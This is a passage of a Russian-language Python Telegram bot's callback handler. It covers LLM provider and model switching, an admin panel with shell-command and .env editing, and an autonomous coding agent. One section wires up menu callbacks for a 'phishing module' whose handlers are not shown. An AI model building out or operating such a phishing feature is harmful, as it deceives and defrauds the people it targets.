            'improve': ("🚀 Улучшаю код...", "fix",
                        "Улучши и расшири код: оптимизируй, добавь обработку ошибок, "
                        "улучши читаемость. Верни улучшенную версию."),
            'build':   ("🏗 Создаю на основе этого...", "plan",
                        "Используй этот код как основу и создай расширенный проект "
                        "с дополнительным функционалом."),
        }

        if arg not in action_map:
            answer_callback(cb_id, "❓ Неизвестное действие")
            return

        status_msg, proj_mode, task_prompt = action_map[arg]
        filename_f = pending['filename']

        answer_callback(cb_id, status_msg)
        edit_message(chat_id, msg_id,
            "⚙️ <b>{}</b>\nФайл: <code>{}</code>".format(status_msg, filename_f),
            reply_markup=None)

        # Читаем содержимое файла для передачи в агент
        try:
            with open(pending['path'], 'r', encoding='utf-8', errors='ignore') as f:
                file_content = f.read()
        except Exception as e:
            file_content = pending['analysis']  # fallback на анализ

        full_task = "{}\n\nФайл: {}\n\n```\n{}\n```".format(
            task_prompt, filename_f, file_content[:8000])

        _pending_file.pop(chat_id, None)

        def _do_file_action():
            _run_code_task(chat_id, full_task, proj_mode=proj_mode if proj_mode != 'plan' else None)
        _run_in_thread(_do_file_action)

    elif action == 'llm_check':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "⏳ Проверяю {} провайдеров...".format(len(__import__('llm_checker').PROVIDERS) + 1),
            reply_markup=None)

        def _do_llm_check():
            results = check_all(api_key=config.LLM_API_KEY)
            text = format_check_results(results)
            # Кнопки с рабочими провайдерами
            ok_providers = [r['name'] for r in results if r['ok']]
            rows = []
            for i in range(0, len(ok_providers), 2):
                row = [btn("✅ {}".format(p), "llm_use:{}".format(p))
                       for p in ok_providers[i:i+2]]
                rows.append(row)
            rows.append([back_btn("menu_llm")])
            send_message(text, chat_id, reply_markup=kb(*rows) if rows else None)

        _run_in_thread(_do_llm_check)

    elif action == 'llm_pick':
        # Нажата кнопка провайдера из /llm меню
        provider = arg
        answer_callback(cb_id, "✅ {}".format(provider))
        rec = RECOMMENDED.get(provider, [])

        # Применяем провайдер сразу с дефолтной моделью
        default_model = rec[0] if rec else config.LLM_MODEL
        config.LLM_PROVIDER = provider
        config.LLM_MODEL = default_model

        if rec:
            # Показываем выбор модели
            rows = []
            for i in range(0, min(len(rec), 8), 2):
                row = [btn_model(rec[j], provider, rec[j]) for j in range(i, min(i+2, len(rec)))]
                rows.append(row)
            rows.append([btn_model("✅ Оставить {}".format(default_model[:20]), provider, default_model)])
            edit_message(chat_id, msg_id,
                "✅ Провайдер: <b>{}</b>\n\nВыбери модель:".format(provider),
                reply_markup=kb(*rows))
        else:
            # Нет рекомендаций — просто применяем
            edit_message(chat_id, msg_id,
                "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>".format(
                    provider, default_model),
                reply_markup=kb([btn("◀️ Меню", "menu_llm")]))

    elif action == 'llm_m':
        # Короткий ID из _mdl_cache → разворачиваем в полный provider:model
        key_val = _mdl_cache.get(arg, '')
        if not key_val:
            answer_callback(cb_id, "❌ Кеш устарел, выбери снова", alert=True)
        else:
            parts = key_val.split(':', 1)
            if len(parts) == 2:
                # Переиспользуем логику llm_setmodel через подстановку
                from llm_client import _PROVIDER_KEY_MAP
                provider, model = parts
                _update_env('LLM_PROVIDER', provider)
                _update_env('LLM_MODEL', model)
                # Подставляем ключ провайдера в LLM_API_KEY
                new_key_attr2 = _PROVIDER_KEY_MAP.get(provider.lower(), '')
                if new_key_attr2:
                    new_key2 = os.environ.get(new_key_attr2, '')
                    if new_key2:
                        _update_env('LLM_API_KEY', new_key2)
                config.reload()
                answer_callback(cb_id, "✅ {}/{}".format(provider, model[:20]))
                key_attr = _PROVIDER_KEY_MAP.get(provider.lower(), 'LLM_API_KEY')
                has_key  = bool(getattr(config, key_attr, '') or getattr(config, 'LLM_API_KEY', ''))
                rows = [[btn("🧪 Тест", "test"), btn("◀️ LLM меню", "menu_llm")]]
                if not has_key and provider.lower() != 'ollama':
                    rows.insert(0, [btn("🔑 Добавить ключ ← НУЖЕН", "llm_addkey:{}".format(provider))])
                edit_message(chat_id, msg_id,
                    "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>".format(provider, model),
                    reply_markup=kb(*rows))

    elif action == 'llm_setmodel':
        # arg = "provider:model" — сохраняем в .env немедленно
        parts = arg.split(':', 1)
        if len(parts) == 2:
            provider, model = parts
            _update_env('LLM_PROVIDER', provider)
            _update_env('LLM_MODEL', model)
            # Перенос ключей: при смене провайдера подставляем его ключ в LLM_API_KEY
            from llm_client import _PROVIDER_KEY_MAP as _PKM
            new_key_attr = _PKM.get(provider.lower(), '')
            if new_key_attr:
                new_key = os.environ.get(new_key_attr, '')
                if new_key:
                    _update_env('LLM_API_KEY', new_key)
            config.reload()
            answer_callback(cb_id, "✅ {} / {}".format(provider, model[:25]))
            # Проверяем ключ
            from llm_client import _PROVIDER_KEY_MAP
            key_attr  = _PROVIDER_KEY_MAP.get(provider.lower(), 'LLM_API_KEY')
            has_key   = bool(getattr(config, key_attr, '') or getattr(config, 'LLM_API_KEY', ''))
            if not has_key and provider.lower() != 'ollama':
                rows = [
                    [btn("🔑 Добавить ключ ← НУЖЕН", "llm_addkey:{}".format(provider))],
                    [btn("◀️ LLM меню", "menu_llm")],
                ]
                edit_message(chat_id, msg_id,
                    "✅ Активировано: <b>{}</b> / <code>{}</code>\n\n"                    "⚠️ <b>Нет API ключа!</b> Без него запросы упадут.".format(provider, model),
                    reply_markup=kb(*rows))
            else:
                # Ключ есть — сразу запускаем тест в фоне
                def _quick_test(_prov=provider, _mdl=model, _cid=chat_id):
                    from llm_client import test_connection
                    ok, msg = test_connection()
                    icon = '✅' if ok else '❌'
                    send_message(
                        "{} {} / {}\n{}".format(icon, _prov, _mdl, msg[:200]),
                        _cid,
                        reply_markup=kb([btn("🔄 Сменить модель", "menu_llm"),
                                         btn("◀️ Меню", "menu")])
                    )
                edit_message(chat_id, msg_id,
                    "✅ <b>{}</b> / <code>{}</code> — активировано\n⏳ Тестирую...".format(provider, model),
                    reply_markup=kb([btn("◀️ LLM меню", "menu_llm")]))
                _run_in_thread(_quick_test)
        else:
            answer_callback(cb_id, "❌ Ошибка", alert=True)

    elif action == 'llm_confirm':
        # arg может быть 'provider:model' или 'mN' (из _mdl_cache через btn_model)
        if arg.startswith('m') and arg[1:].isdigit():
            key_val = _mdl_cache.get(arg, '')
            parts = key_val.split(':', 1) if key_val else []
        else:
            parts = arg.split(':', 1)
        provider, model = (parts[0], parts[1]) if len(parts) == 2 else (config.LLM_PROVIDER, config.LLM_MODEL)
        _update_env('LLM_PROVIDER', provider)
        _update_env('LLM_MODEL', model)
        # Подставляем ключ нового провайдера в LLM_API_KEY
        from llm_client import _PROVIDER_KEY_MAP as _PKM_C
        _ck_attr = _PKM_C.get(provider.lower(), '')
        if _ck_attr:
            _ck = os.environ.get(_ck_attr, '')
            if _ck:
                _update_env('LLM_API_KEY', _ck)
        config.reload()
        answer_callback(cb_id, "✅ Сохранено")
        edit_message(chat_id, msg_id,
            "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>".format(provider, model),
            reply_markup=kb(
                [btn("🧪 Тест", "test")],
                [btn("◀️ Назад", "menu_llm")]
            ))

    elif action == 'llm_use':
        # Быстрое переключение на провайдер из результатов проверки
        provider = arg
        recommended = RECOMMENDED.get(provider, [])
        default_model = recommended[0] if recommended else config.LLM_MODEL
        config.LLM_PROVIDER = provider
        config.LLM_MODEL = default_model
        answer_callback(cb_id, "✅ Переключено на {}".format(provider))
        edit_message(chat_id, msg_id,
            "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>\n\n"
            "Проверяю доступность...".format(provider, default_model),
            reply_markup=None)
        result = check_provider(provider, config.LLM_API_KEY)
        if result['ok']:
            models = result['models'] or result['recommended']
            rows = [[btn(m, "setmodel:{}".format(m))] for m in models[:6]]
            rows.append([back_btn("llm_check")])
            send_message(
                "🟢 <b>{}</b> работает!\n\nДоступные модели — выбери:".format(provider),
                chat_id, reply_markup=kb(*rows))
        else:
            send_message("🔴 Провайдер {} недоступен: {}".format(provider, result['error']),
                        chat_id, reply_markup=kb([back_btn("llm_check")]))

    elif action == 'setmodel':
        config.LLM_MODEL = arg
        answer_callback(cb_id, "✅ Модель: {}".format(arg))
        send_message("✅ Модель установлена: <code>{}</code>".format(arg), chat_id,
                    reply_markup=llm_keyboard())

    # ── Авто-поиск моделей ────────────────────────────────────
    elif action == 'models_discover':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "🔍 Определяю провайдер и ищу доступные модели...",
            reply_markup=None)

        def _discover():
            provider = config.LLM_PROVIDER.lower()
            key      = config.LLM_API_KEY

            if provider == 'openrouter':
                models, err = get_openrouter_models_cached(key, force=True)
                if err:
                    send_message("❌ Ошибка OpenRouter: {}".format(err), chat_id,
                                reply_markup=kb([back_btn("menu_llm")]))
                    return
                summary = format_models_summary(models, "OpenRouter ({})".format(len(models)))
                send_message(summary, chat_id)
                # Показываем бесплатные постранично
                _show_models_page(chat_id, models, page=0)

            elif provider == 'ollama':
                models, err = fetch_ollama_models()
                if err or not models:
                    send_message("❌ Ollama не запущена или нет моделей.\n"
                                 "Запусти: <code>ollama pull llama3.2</code>", chat_id,
                                 reply_markup=kb([back_btn("menu_llm")]))
                    return
                    return
                rows = [[btn(m['id'], 'usemodel:ollama:{}'.format(m['id']))]
                        for m in models]
                rows.append([back_btn("menu_llm")])
                send_message(
                    "🦙 <b>Ollama — локальные модели ({}шт.):</b>".format(len(models)),
                    chat_id, reply_markup=kb(*rows))

            else:
                # Любой другой провайдер — пробуем /v1/models
                from llm_checker import PROVIDERS
                info = PROVIDERS.get(provider, {})
                base_url = info.get('url', '').replace('/models', '').replace('/api/tags', '')
                models, err = fetch_any_provider_models(base_url, key, provider)
                if err or not models:
                    # Показываем рекомендованные
                    rec = RECOMMENDED.get(provider, [])
                    if rec:
                        rows = [[btn(m, 'usemodel:{}:{}'.format(provider, m))] for m in rec]
                        rows.append([back_btn("menu_llm")])
                        send_message(
                            "📋 <b>{}</b> — рекомендуемые модели:".format(provider),
                            chat_id, reply_markup=kb(*rows))
                    else:
                        send_message(
                            "⚠️ Не удалось получить модели для <b>{}</b>.\n"
                            "Попробуй переключиться на <b>openrouter</b> для 300+ моделей.".format(provider),
                            chat_id, reply_markup=kb(
                                [btn("🌐 Переключить на OpenRouter", "provider_set:openrouter")],
                                [back_btn("menu_llm")]))
                    return

                rows = [[btn(m['id'][:40], 'usemodel:{}:{}'.format(provider, m['id']))]
                        for m in models[:15]]
                rows.append([back_btn("menu_llm")])
                send_message(
                    "📋 <b>{}</b> — доступные модели ({}шт.):".format(provider, len(models)),
                    chat_id, reply_markup=kb(*rows))

        _run_in_thread(_discover)

    elif action == 'models_page':
        answer_callback(cb_id)
        page = int(arg) if arg.isdigit() else 0
        models, _ = get_openrouter_models_cached(config.LLM_API_KEY)
        if models:
            _show_models_page(chat_id, models, page, msg_id=msg_id)
        else:
            answer_callback(cb_id, "❌ Нет кэша моделей", alert=True)

    elif action == 'usemodel':
        # arg = "provider:model_id"
        parts = arg.split(':', 1)
        if len(parts) == 2:
            provider, model_id = parts
            config.LLM_PROVIDER = provider
            config.LLM_MODEL    = model_id
            answer_callback(cb_id, "✅ {}  {}".format(provider, model_id[:30]))
            send_message(
                "✅ Переключено:\nПровайдер: <b>{}</b>\nМодель: <code>{}</code>".format(
                    provider, model_id),
                chat_id, reply_markup=llm_keyboard())
        else:
            answer_callback(cb_id, "❌ Неверный формат", alert=True)

    elif action == 'provider_set':
        config.LLM_PROVIDER = arg
        answer_callback(cb_id, "✅ Провайдер: {}".format(arg))
        send_message(
            "✅ Провайдер: <b>{}</b>\n\nВведи ключ командой:\n"
            "<code>/setllm {} MODEL ВАШ_КЛЮЧ</code>\n\n"
            "Или открой 🌐 Все модели для поиска.".format(arg, arg),
            chat_id, reply_markup=llm_keyboard())

    elif action == 'quickllm':
        # arg = "provider:model"
        parts = arg.split(':', 1)
        if len(parts) == 2:
            provider, model = parts
            config.LLM_PROVIDER = provider
            config.LLM_MODEL = model
            answer_callback(cb_id, "✅ {} / {}".format(provider, model[:30]))
            edit_message(chat_id, msg_id,
                "✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>\n\n"
                "Ключ берётся из .env автоматически.\n"
                "Если нет ключа — добавь <code>{}_API_KEY=...</code>".format(
                    provider, model, provider.upper()),
                reply_markup=kb([btn("🧪 Тест", "llm_test"), btn("◀️ Назад", "menu_llm")]))
        else:
            answer_callback(cb_id, "❌ Ошибка", alert=True)

    elif action == 'noop':
        answer_callback(cb_id)

    # ── 🎣 Фишинг-модуль callbacks ────────────────────────────
    elif action == 'menu_fish':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id, "🎣 <b>Фишинг-модуль</b>",
                     reply_markup=fish_menu_keyboard())

    elif action == 'fish':
        # fish:action — delegate to fish handler
        answer_callback(cb_id)
        _fish_handle_action(arg, chat_id)

    elif action == 'fish_selfile':
        # fish_selfile:file_id
        answer_callback(cb_id)
        _fish_handle_selfile(arg, chat_id)

    elif action == 'fish_opt':
        # fish_opt:toggle_name
        answer_callback(cb_id)
        _fish_handle_opt(arg, chat_id)

    elif action == 'fish_opt_html':
        # fish_opt_html:toggle_name — для загруженных HTML
        answer_callback(cb_id)
        _fish_handle_opt_html(arg, chat_id)


    elif action == 'llm_test':
        answer_callback(cb_id)
        def _do_test():
            from llm_client import test_connection
            ok, msg = test_connection()
            ms, err = 0, msg
            if ok:
                send_message("✅ LLM работает! {}/{} — {}мс".format(
                    config.LLM_PROVIDER, config.LLM_MODEL, ms), chat_id,
                    reply_markup=kb([back_btn("menu_llm")]))
            else:
                send_message("❌ {} — {}".format(config.LLM_PROVIDER, err), chat_id,
                    reply_markup=kb([btn("🔍 Проверить все", "llm_check"), back_btn("menu_llm")]))
        _run_in_thread(_do_test)

    elif action == 'cancel_wait':
        _wait_state.pop(chat_id, None)
        answer_callback(cb_id, "❌ Отменено")
        edit_message(chat_id, msg_id, "❌ Отменено.", reply_markup=menu_keyboard(chat_id))

    # ══════════════════════════════════════════════════════════
    #  🔑 АДМИНИСТРАТОР
    # ══════════════════════════════════════════════════════════
    elif action == 'admin':
        if not ADMIN_ENABLED or not is_admin(chat_id):
            answer_callback(cb_id, "🚫 Нет доступа", alert=True); return
        answer_callback(cb_id)
        edit_message(chat_id, msg_id, "🔑 <b>Панель администратора</b>",
                     reply_markup=admin_main_keyboard())

    elif action == 'adm_noop':
        answer_callback(cb_id)

    elif action == 'adm':
        if not ADMIN_ENABLED or not is_admin(chat_id):
            answer_callback(cb_id, "🚫 Нет доступа", alert=True); return
        answer_callback(cb_id)
        log_admin_cmd(chat_id, f"adm:{arg}")

        # ── Пользователи ──────────────────────────────────
        if arg == 'users' or arg.startswith('users_page:'):
            page = int(arg.split(':')[1]) if ':' in arg else 0
            text_u, markup_u = format_users_list(page)
            edit_message(chat_id, msg_id, text_u, reply_markup=markup_u)

        elif arg.startswith('manage:'):
            target = arg.split(':')[1]
            u = get_user(int(target))
            login = (u or {}).get('login','?')
            edit_message(chat_id, msg_id,
                f"⚙️ <b>Управление: {login}</b> (<code>{target}</code>)",
                reply_markup=user_manage_keyboard(target))

        elif arg.startswith('view_user:'):
            target = arg.split(':')[1]
            edit_message(chat_id, msg_id,
                format_profile(int(target)),
                reply_markup=kb([btn("⚙️ Управлять", f"adm:manage:{target}"),
                                  btn("◀️ Назад", "adm:users")]))

        elif arg.startswith('priv:'):
            parts = arg.split(':')
            target, priv = parts[1], parts[2]
            set_privilege(int(target), priv)
            icon = PRIVILEGE_ICONS.get(priv,'👤')
            answer_callback(cb_id, f"✅ {priv} выдано {icon}")
            u = get_user(int(target))
            edit_message(chat_id, msg_id,
                f"✅ Привилегия <b>{priv}</b> {icon} выдана пользователю <code>{target}</code>",
                reply_markup=user_manage_keyboard(target))

        elif arg.startswith('ban:'):
            target = arg.split(':')[1]
            ban_user(target)
            answer_callback(cb_id, "🚫 Заблокирован")
            edit_message(chat_id, msg_id,
                f"🚫 Пользователь <code>{target}</code> заблокирован.",
                reply_markup=user_manage_keyboard(target))

        elif arg.startswith('unban:'):
            target = arg.split(':')[1]
            unban_user(target)
            answer_callback(cb_id, "✅ Разблокирован")
            edit_message(chat_id, msg_id,
                f"✅ Пользователь <code>{target}</code> разблокирован.",
                reply_markup=user_manage_keyboard(target))

        elif arg.startswith('kick:'):
            target = arg.split(':')[1]
            from auth_module import auth_session_delete
            auth_session_delete(int(target))
            answer_callback(cb_id, "🔴 Выбит из сессии")
            send_message(f"🔴 Пользователь <code>{target}</code> выбит из сессии.",
                         chat_id, reply_markup=user_manage_keyboard(target))

        elif arg.startswith('delete_user:'):
            target = arg.split(':')[1]
            delete_user(target)
            answer_callback(cb_id, "🗑 Удалён")
            edit_message(chat_id, msg_id,
                f"🗑 Пользователь <code>{target}</code> удалён.",
                reply_markup=kb([btn("◀️ Список", "adm:users")]))

        # ── Сообщения ─────────────────────────────────────
        elif arg == 'msg_user':
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_msg_target')
            send_message("📩 Введи chat_id или @username получателя:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg.startswith('msg_to:'):
            target = arg.split(':')[1]
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_msg_text', {'target': target})
            send_message(f"✏️ Введи текст сообщения для <code>{target}</code>:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'broadcast':
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_broadcast')
            all_u = get_all_users()
            active_count = sum(1 for u in all_u if u.get('status')=='active')
            send_message(f"📣 Рассылка <b>всем</b> ({active_count} активных).\n\nВведи текст:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'notify_online':
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_notify')
            send_message("🔔 Введи текст уведомления:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","admin")]))

        # ── Система ───────────────────────────────────────
        elif arg == 'sysinfo':
            info = get_system_info()
            edit_message(chat_id, msg_id, info,
                         reply_markup=kb([btn("🔄 Обновить","adm:sysinfo"),
                                          btn("◀️ Меню","admin")]))

        elif arg == 'processes':
            procs = list_processes()
            edit_message(chat_id, msg_id, procs,
                         reply_markup=kb([btn("💀 Убить PID","adm:kill_proc"),
                                          btn("🔄 Обновить","adm:processes"),
                                          btn("◀️ Меню","admin")]))

        elif arg == 'kill_proc':
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_kill_pid')
            send_message("💀 Введи PID процесса для завершения:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'restart_bot':
            answer_callback(cb_id, "🔄 Перезапускаю...")
            send_message("🔄 Бот перезапускается через 3 секунды...", chat_id)
            import threading as _thr, platform as _plat
            def _restart():
                import time as _t
                _t.sleep(3)
                try:
                    if _plat.system() == 'Windows':
                        # Windows: запускаем новый процесс, текущий завершается
                        subprocess.Popen(
                            [sys.executable] + sys.argv,
                            cwd=config.BASE_DIR,
                            creationflags=subprocess.CREATE_NEW_CONSOLE
                        )
                        os._exit(0)
                    else:
                        os.execv(sys.executable, [sys.executable] + sys.argv)
                except Exception as e:
                    send_message(f"❌ Ошибка перезапуска: {e}", chat_id)
            _thr.Thread(target=_restart, daemon=True).start()

        elif arg == 'exec_cmd':
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_exec_cmd')
            send_message("💻 Введи shell-команду:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'logs':
            logs = get_recent_logs(30)
            send_message(f"📊 <b>Логи (последние 30 строк):</b>\n<pre>{logs[:3000]}</pre>",
                         chat_id, reply_markup=kb([btn("◀️ Адм. меню","admin")]))

        elif arg == 'reload_config':
            config.reload()
            answer_callback(cb_id, "✅ Config перезагружен")
            send_message("✅ Config перезагружен.", chat_id,
                         reply_markup=kb([btn("◀️ Адм. меню","admin")]))

        elif arg == 'show_keys':
            answer_callback(cb_id)
            from admin_module import is_god
            if not is_god(chat_id):
                send_message("⚡ <b>Только GOD</b>\n\nДоступ к API ключам есть только у роли БОГ.", chat_id,
                             reply_markup=kb([btn("◀️ Адм. меню","admin")])); return
            lines = ["🗝 <b>API ключи (.env)</b>\n"]
            key_map = [
                ('BOT_TOKEN','Telegram Token'),
                ('LLM_API_KEY','LLM'),('OPENAI_API_KEY','OpenAI'),
                ('GROQ_API_KEY','Groq'),('GEMINI_API_KEY','Gemini'),
                ('ANTHROPIC_API_KEY','Claude'),('ELEVEN_API_KEY','ElevenLabs'),
                ('OPENROUTER_API_KEY','OpenRouter'),('STABILITY_API_KEY','Stability'),
                ('ADMIN_WEB_TOKEN','Admin Web Token'),
            ]
            for env_k, label in key_map:
                val = os.environ.get(env_k,'')
                if val:
                    lines.append(f"✅ {label}: <code>{val[:6]}...{val[-3:]}</code>")
                else:
                    lines.append(f"❌ {label}: не задан")
            send_message("\n".join(lines), chat_id,
                         reply_markup=kb(
                             [btn("⚙️ Редактировать .env","adm:edit_env")],
                             [btn("◀️ Адм. меню","admin")]
                         ))

        elif arg == 'edit_env':
            answer_callback(cb_id)
            from admin_module import is_god, adm_wait_set
            if not is_god(chat_id):
                send_message("⚡ <b>Только GOD</b>", chat_id); return
            adm_wait_set(chat_id, 'adm_edit_env')
            send_message(
                "⚙️ <b>Редактирование .env</b>\n\n"
                "Введи в формате:\n"
                "<code>КЛЮЧ=значение</code>\n\n"
                "Примеры:\n"
                "<code>GROQ_API_KEY=gsk_xxx</code>\n"
                "<code>LLM_PROVIDER=openai</code>\n\n"
                "⚠️ Изменения применятся сразу",
                chat_id, reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'god_panel':
            answer_callback(cb_id)
            from admin_module import is_god
            if not is_god(chat_id):
                send_message("⚡ Только GOD", chat_id); return
            users = get_all_users()  # используем глобальный импорт
            by_role = {}
            for u in users:
                r = u.get('privilege','user')
                by_role[r] = by_role.get(r,0) + 1
            stats = "\n".join(f"  {k}: {v}" for k,v in sorted(by_role.items()))
            send_message(
                "⚡ <b>GOD ПАНЕЛЬ</b>\n\n"
                f"👥 Пользователей: {len(users)}\n"
                f"📊 По ролям:\n{stats}\n\n"
                "Управление:",
                chat_id,
                reply_markup=kb(
                    [btn("🗝 API ключи",       "adm:show_keys")],
                    [btn("⚙️ .env",            "adm:edit_env")],
                    [btn("💰 Установить штраф","adm:set_fine")],
                    [btn("👤 Назначить роль",  "adm:set_priv")],
                    [btn("📣 Рассылка",         "adm:broadcast")],
                    [btn("◀️ Адм. меню",        "admin")],
                ))

        elif arg == 'set_fine':
            answer_callback(cb_id)
            from admin_module import is_god, adm_wait_set
            if not is_god(chat_id):
                send_message("⚡ Только GOD", chat_id); return
            current = os.environ.get('BAN_FINE_AMOUNT', '0')
            adm_wait_set(chat_id, 'adm_set_fine')
            send_message(
                f"💰 <b>Штраф за бан</b>\n\n"
                f"Текущий: <b>{current}</b> кредитов\n\n"
                "Введи новую сумму штрафа (в кредитах):",
                chat_id, reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'cmd_history':
            from admin_module import _cmd_log
            if not _cmd_log:
                send_message("📜 История пуста.", chat_id,
                             reply_markup=kb([btn("◀️ Адм. меню","admin")]))
            else:
                lines = ["📜 <b>История команд:</b>\n"]
                for entry in _cmd_log[-20:]:
                    lines.append(f"<code>{entry['ts']}</code> [{entry['admin']}] {entry['cmd']}")
                send_message("\n".join(lines), chat_id,
                             reply_markup=kb([btn("◀️ Адм. меню","admin")]))

        elif arg == 'find_user':
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_find_user')
            send_message("🔍 Введи login, @username или chat_id:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'add_rating':
            from admin_module import adm_wait_set
            adm_wait_set(chat_id, 'adm_add_rating')
            send_message("⭐ Введи: <code>chat_id очки</code>\nПример: <code>123456789 100</code>",
                         chat_id, reply_markup=kb([btn("❌ Отмена","admin")]))

        elif arg == 'spawn_agent':
            answer_callback(cb_id)
            try:
                from agent_session import create_session
                create_session(chat_id)
            except ImportError:
                pass
            _wait_state[chat_id] = 'adm_agent_task'
            send_message(
                "🤖 <b>АГЕНТ_0051</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Автономный агент администратора.\n\n"
                "📝 Опиши задачу\n"
                "📎 Прикрепи файлы (если нужно)\n"
                "✅ Напиши <b>готово</b> для запуска\n\n"
                "<i>Умеет: код, анализ, автоматизация, работа с файлами, сеть, СМИТ-pipeline</i>",
                chat_id,
                reply_markup=kb(
                    [btn("🚀 Готово", "_agent_go")],
                    [btn("❌ Отмена", "adm:close_agent")],
                )
            )

        elif arg == 'smith_menu' or arg.startswith('smith:') or arg == 'smith_coder' or arg.startswith('sc:') or arg == 'close_agent':
            # Делегируем в отдельные elif ниже через перевызов
            _route_smith(arg, cb_id, chat_id, msg_id)
        elif arg == 'smith_coder':
            answer_callback(cb_id)
            edit_message(chat_id, msg_id,
                "🕵️💻 <b>АГЕНТ_СМИТ — Кодер</b>\n\n"
                "🖊 <b>Написать код</b> — опиши задачу, Смит напишет, протестирует и отдаст zip\n"
                "🔍 <b>Ревью кода</b> — найдёт баги, уязвимости, code-smell\n"
                "🔧 <b>Исправить ошибку</b> — вставь код + traceback → авто-фикс x15\n"
                "📦 <b>Создать проект</b> — полная структура с файлами, тестами, README\n"
                "🏖 <b>Sandbox</b> — выполни любой Python-код прямо сейчас\n"
                "🤖 <b>Инструменты бота</b> — управление туннелем, файлами, env\n"
                "📁 <b>Создать файл</b> — txt / md / csv / docx / zip\n"
                "🧩 <b>Scaffold</b> — Смит создаёт полный шаблон проекта\n"
                "🔄 <b>Рефакторинг</b> — улучшит код, добавит типы и docstrings\n"
                "🧪 <b>Тесты</b> — напишет pytest / unittest тесты\n"
                "📊 <b>Анализ кода</b> — сложность, зависимости, метрики\n"
                "🐳 <b>Dockerize</b> — добавит Dockerfile + compose к проекту\n\n"
                f"Модель: <b>{config.LLM_PROVIDER} / {config.LLM_MODEL}</b>",
                reply_markup=kb(
                    [btn("🖊 Написать код",        "adm:sc:write"),
                     btn("🔍 Ревью кода",          "adm:sc:review")],
                    [btn("🔧 Исправить ошибку",    "adm:sc:fix"),
                     btn("📦 Создать проект",      "adm:sc:project")],
                    [btn("🏖 Sandbox",             "adm:sc:sandbox"),
                     btn("🤖 Инструменты бота",    "adm:sc:bot_tools")],
                    [btn("📁 Создать файл",        "adm:sc:file"),
                     btn("🧩 Scaffold",            "adm:sc:scaffold")],
                    [btn("🔄 Рефакторинг",         "adm:sc:refactor"),
                     btn("🧪 Написать тесты",      "adm:sc:tests")],
                    [btn("📊 Анализ кода",         "adm:sc:analyze"),
                     btn("🐳 Dockerize",           "adm:sc:dockerize")],
                    [btn("◀️ АГЕНТ_СМИТ",          "adm:smith_menu")],
                ))

        elif arg.startswith('sc:'):
            answer_callback(cb_id)
            sc_mode = arg.split(':', 1)[1]

            SC_PROMPTS = {
                'write':     ("🖊 Опиши задачу — Смит напишет код, протестирует и отдаст zip:",
                              "напиши рабочий Python-скрипт для задачи: {task}"),
                'review':    ("🔍 Вставь код для ревью (найду баги и уязвимости):",
                              "сделай code review этого кода, найди баги, проблемы безопасности и code-smell:\n{task}"),
                'fix':       ("🔧 Вставь код + traceback ошибки:",
                              "исправь ошибку в этом коде:\n{task}"),
                'project':   ("📦 Опиши проект (название, функции, структура):",
                              "создай полную структуру Python-проекта: {task}\nВключи main.py, requirements.txt, README.md, тесты"),
                'sandbox':   ("🏖 Вставь Python-код для запуска в sandbox:",
                              "запусти и проверь этот код:\n{task}"),
                'bot_tools': ("🤖 Опиши задачу для агента с инструментами бота:",
                              "используй инструменты бота для: {task}"),
                'file':      ("📁 Что создать? (опиши файл: тип, содержимое, название):",
                              "создай файл: {task}"),
                'scaffold':  ("🧩 Опиши шаблон проекта (тип: flask/fastapi/bot/cli/lib):",
                              "создай полный scaffold Python-проекта типа: {task}"),
                'refactor':  ("🔄 Вставь код для рефакторинга:",
                              "отрефактори этот код: добавь типы, docstrings, улучши структуру:\n{task}"),
                'tests':     ("🧪 Вставь код для которого нужны тесты:",
                              "напиши pytest тесты для этого кода с coverage 80%+:\n{task}"),
                'analyze':   ("📊 Вставь код для анализа (метрики, зависимости, сложность):",
                              "проанализируй этот код: цикломатическая сложность, зависимости, проблемные места:\n{task}"),
                'dockerize': ("🐳 Опиши проект (или вставь main.py) для dockerize:",
                              "создай Dockerfile + docker-compose.yml для Python-проекта: {task}"),
            }

            prompt_msg, task_template = SC_PROMPTS.get(sc_mode,
                ("Опиши задачу:", "выполни: {task}"))

            # Для sandbox и bot_tools — используем старый кодер
            if sc_mode in ('sandbox', 'bot_tools'):
                coder_map = {'sandbox': 'sandbox', 'bot_tools': 'bot_tools'}
                _pending_agent_task[chat_id] = {}
                _wait_state[chat_id] = f'coder_wait:{coder_map[sc_mode]}'
                edit_message(chat_id, msg_id, prompt_msg,
                             reply_markup=kb([btn("❌ Отмена", "adm:smith_coder")]))
            else:
                # Создаём сессию СМИТА
                try:
                    from agent_session import create_session, STAGE_WAIT_FILES
                    sess = create_session(chat_id)
                    sess.stage = STAGE_WAIT_FILES
                    sess._sc_template = task_template  # сохраняем шаблон
                    sess._sc_mode = sc_mode
                except Exception:
                    pass
                _wait_state[chat_id] = f'adm_sc_input:{sc_mode}'
                edit_message(chat_id, msg_id,
                    f"🕵️💻 <b>СМИТ — {sc_mode.upper()}</b>\n\n{prompt_msg}",
                    reply_markup=kb([btn("❌ Отмена", "adm:smith_coder")]))
            answer_callback(cb_id)
